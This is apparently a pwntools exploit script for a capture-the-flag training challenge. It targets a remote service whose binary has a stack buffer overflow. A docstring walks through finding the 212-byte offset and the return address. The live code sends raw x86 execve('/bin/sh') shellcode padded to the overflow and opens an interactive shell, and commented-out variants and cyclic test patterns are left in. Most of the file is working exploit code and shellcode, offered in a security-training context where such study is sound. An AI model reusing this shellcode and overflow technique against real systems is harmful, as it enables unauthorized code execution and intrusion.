from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./sh3llc0d3") #
r = remote("bin.training.jinblack.it", 2002)

'''
Inject a shellcode and get read the flag.

Solution
First by using ghidra decompile the file and inside the get_name(buffer) function there is an overflow. Since the buffer declared in prog() has a size of 208 but the read in get_name takes 1000 characters which are copied in the buffer prog reference. There is a problem: if in the first 1000 characters there is a \0 (EOF) the loop break and is impossible to return. To solve:

Since is a x86 architecture we use cyclic 1000 to generate a pattern and find when overflow the EIP. We get invalid address in EIP of value 0x63616164, by doing cyclic -l 0x63616164 we get the offset of 212. The first part of our payload will be "A"*212.

By inspecting ghidra we find the address of the buffer (the global one), stored in the .bss section 0x804c060. Since our shellcode requires \x00 after the string /bin/sh we can't put the shellcode in the begin otherwise the read will truncate the exploit, so we put it in the end, check step 3. The address that will overwrite EIP will be 0x804C13A which is the base address of the buffer plus 212 and something else. In this way the return will jump in the final portion of the explit, where is the shellcode.

Until now we have "A"*212 + p32(0x804C13A). We still need padding to reach 1000 characters and the shellcode. To do so, we write first the shellcode:

jmp binsh
back:
xor eax, eax
mov al, 0xb
pop ebx
xor ecx, ecx
xor edx, edx
int 0x80

binsh:
call back
nop
nop
In ebx there will be the address of the first nop after call back. In python we'll substitute \x90 with /bin/sh. After the address we put \x90 to reach 1004-len(shellcode)(-4 because the 0's after /bin/sh) and then the shellcode. Since the EIP is pointing in one of the \x90 position, after return these will be executed and eventually do also the shellcode. The final payload:

shellcode = b"\xEB\x0B\x31\xC0\xB0\x0B\x5B\x31\xC9\x31\xD2\xCD\x80\xE8\xF0\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00"
payload = b"A"*212 + p32(0x804C13a)
payload = payload.ljust(1004-len(shellcode),b"\x90") + shellcode
'''

# jmp binsh
# beforethemove:
# mov rax, 0x3b
# pop rdi
# mov rsi, 0
# mov rdx, 0
# syscall
# binsh:
# call beforethemove
# nop
# nop
# nop

#gdb.attach(r, """
#	b *(get_name +133)
#	c
#""")
# you can use ghidra to find it the right address
#input("wait")

#shellcode = b"\xEB\x18\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\xE8\xE3\xFF\xFF\xFF/bin/sh\x00"
#shellcode = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaat"
#shellcode = b"A" * 212 + b"BBBBBBBB" 
#shellcode = b"A" * 212 + p32(0x0804c060)
#shellcode = shellcode + b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaah"

shellcode32bit = b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
shellcode = shellcode32bit.ljust(212, b"A") + p32(0x0804c060)# + shellcode32bit#b"\x60\xc0\x04\x00"
shellcode = shellcode.ljust(1000, b"C")


#shellcode = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj"
#shellcode = b"ciao"
#shellcode = shellcode.ljust(1005, b"A") + b"trogolo"# p64(0x601080) 
print(shellcode)
print("lunghezza in bytes dello shellcode: "+ str(len(shellcode)))
#print(r.recvuntil(b"What is your name?\n"))

r.send(shellcode)

r.interactive()
#input("wait")
